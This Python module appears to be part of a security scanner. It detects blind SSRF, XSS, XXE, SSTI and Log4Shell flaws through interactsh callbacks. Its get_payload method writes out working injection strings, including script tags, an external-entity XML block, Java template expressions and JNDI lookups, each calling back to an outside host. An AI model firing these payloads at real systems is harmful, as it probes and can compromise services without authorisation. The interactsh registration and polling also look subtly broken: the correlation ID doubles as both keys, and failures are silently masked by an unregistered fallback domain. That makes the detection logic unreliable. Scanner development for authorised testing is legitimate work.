"""
Vexor Collaborator — Out-of-Band Vulnerability Detection
Detects Blind SSRF, Blind XSS, Blind SQLi via DNS/HTTP callbacks
Uses interactsh (free, open source) as the OOB server
"""
import asyncio
import httpx
import uuid
import time
from typing import Optional


INTERACTSH_SERVER = "https://interact.sh"
INTERACTSH_API = "https://interact.sh/api/v1"


class VexorCollaborator:
    """
    Out-of-band vulnerability detector
    Uses interactsh.com (free, open source alternative to Burp Collaborator)
    """

    def __init__(self):
        self._correlation_id = None
        self._secret_key = None
        self._server_url = None
        self._interactions = []

    async def register(self) -> Optional[str]:
        """Register with interactsh and get a unique subdomain"""
        try:
            async with httpx.AsyncClient(timeout=15) as client:
                # Generate unique ID
                self._correlation_id = str(uuid.uuid4()).replace("-", "")[:20]

                resp = await client.post(
                    f"{INTERACTSH_API}/register",
                    json={
                        "public-key": self._correlation_id,
                        "secret-key": self._correlation_id,
                        "correlation-id": self._correlation_id,
                    }
                )

                if resp.status_code == 200:
                    data = resp.json()
                    self._server_url = data.get("domain", "interact.sh")
                    return f"{self._correlation_id}.{self._server_url}"

        except Exception:
            pass

        # Fallback: use a simple unique subdomain format
        self._correlation_id = str(uuid.uuid4()).replace("-", "")[:16]
        return f"{self._correlation_id}.interact.sh"

    def get_payload(self, vuln_type: str = "ssrf") -> dict:
        """Get OOB payloads for different vulnerability types"""
        if not self._correlation_id:
            self._correlation_id = str(uuid.uuid4()).replace("-", "")[:16]

        domain = f"{self._correlation_id}.interact.sh"

        payloads = {
            "ssrf": [
                f"http://{domain}/",
                f"https://{domain}/",
                f"http://{domain}:80/",
            ],
            "blind_xss": [
                f"<script src='http://{domain}/x'></script>",
                f"<img src='http://{domain}/x' onerror='fetch(\"http://{domain}/\")'>",
                f"javascript:fetch('http://{domain}/')",
            ],
            "xxe": [
                f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/">]>
<root>&xxe;</root>""",
            ],
            "ssti": [
                f"${{T(java.net.URL).openConnection('http://{domain}/')}}",
                f"#{{@java.net.URL@openConnection('http://{domain}/')}}",
            ],
            "log4shell": [
                f"${{jndi:ldap://{domain}/a}}",
                f"${{jndi:dns://{domain}/a}}",
            ],
        }

        return {
            "domain": domain,
            "correlation_id": self._correlation_id,
            "payloads": payloads.get(vuln_type, payloads["ssrf"]),
        }

    async def poll_interactions(self) -> list:
        """Poll for OOB interactions"""
        if not self._correlation_id:
            return []

        try:
            async with httpx.AsyncClient(timeout=10) as client:
                resp = await client.get(
                    f"{INTERACTSH_API}/poll",
                    params={
                        "id": self._correlation_id,
                        "secret": self._correlation_id,
                    }
                )

                if resp.status_code == 200:
                    data = resp.json()
                    interactions = data.get("data", [])
                    self._interactions.extend(interactions)
                    return interactions

        except Exception:
            pass

        return []

    async def wait_for_interaction(self, timeout: int = 10) -> Optional[dict]:
        """Wait for an OOB interaction"""
        start = time.time()
        while time.time() - start < timeout:
            interactions = await self.poll_interactions()
            if interactions:
                return interactions[0]
            await asyncio.sleep(2)
        return None
